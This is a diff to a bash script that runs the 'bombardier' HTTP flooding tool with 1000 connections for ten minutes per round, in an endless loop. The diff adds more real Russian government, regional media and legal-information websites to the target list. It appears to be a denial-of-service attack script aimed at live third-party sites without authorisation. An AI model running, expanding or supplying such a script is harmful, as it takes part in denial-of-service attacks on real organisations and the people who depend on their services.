@@ -6,11 +6,6 @@
 BOMBARDIER_TIMEOUT=10m #this is the time of bombardement
 BOMBARDIER_CONNECTIONS=1000
 
-
-garant.ru 
-gossluzhba.gov.ru 
-
-
 declare -a sites=(
 "http://shop-rt.com/"
 "https://www.interfax.ru/"
@@ -100,6 +95,22 @@ declare -a sites=(
 "https://chechnya.gov.ru"
 "https://epp.genproc.gov.ru"
 "https://edu.gov.ru"
+"http://www.sobyanin.ru"
+"https://www.miranda-media.ru/"
+"https://simferopol.miranda-media.ru/"
+"https://sevastopol.miranda-media.ru/"
+"https://novoozernoye.miranda-media.ru/"
+"https://feodosia.miranda-media.ru/"
+"https://yalta.miranda-media.ru/"
+"https://alupka.miranda-media.ru/"
+"https://inkerman.miranda-media.ru/"
+"https://primorskij.miranda-media.ru/"
+"https://oliva.miranda-media.ru/"
+"https://foros.miranda-media.ru/"
+"https://chernomorskoe.miranda-media.ru/"
+"https://kirovskoe.miranda-media.ru/"
+"https://garant.ru"
+"https://gossluzhba.gov.ru"
 )
 
 while :
